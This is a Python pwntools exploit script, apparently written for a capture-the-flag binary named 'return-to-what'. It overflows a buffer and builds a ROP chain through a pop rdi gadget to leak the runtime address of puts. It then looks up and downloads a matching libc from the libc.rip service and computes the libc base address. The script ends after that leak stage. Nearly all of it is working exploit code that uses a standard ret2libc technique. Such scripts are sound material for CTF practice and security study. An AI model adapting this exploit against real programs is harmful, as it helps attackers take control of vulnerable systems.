#!/usr/bin/env python3

from pwn import *
#from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools
binary = context.binary = ELF('./return-to-what')
context.log_level = 'INFO'

context.log_file = 'local.log'
libc = binary.libc
p = process(binary.path)
rop = ROP(binary)

pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = 0x38 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.vuln)

p.sendlineafter('Where would you like to return to?\n',payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))


if not 'libc' in locals():
    try:
        import requests
        r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
        libc_url = r.json()[0]['download_url']
        libc_file = libc_url.split('/')[-1:][0]
        if not os.path.exists(libc_file):
            log.info('getting: ' + libc_url)
            r = requests.get(libc_url, allow_redirects=True)
            open(libc_file,'wb').write(r.content)
    except:
        log.critical('get libc yourself!')
        sys.exit(0)
    libc = ELF(libc_file)
    
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

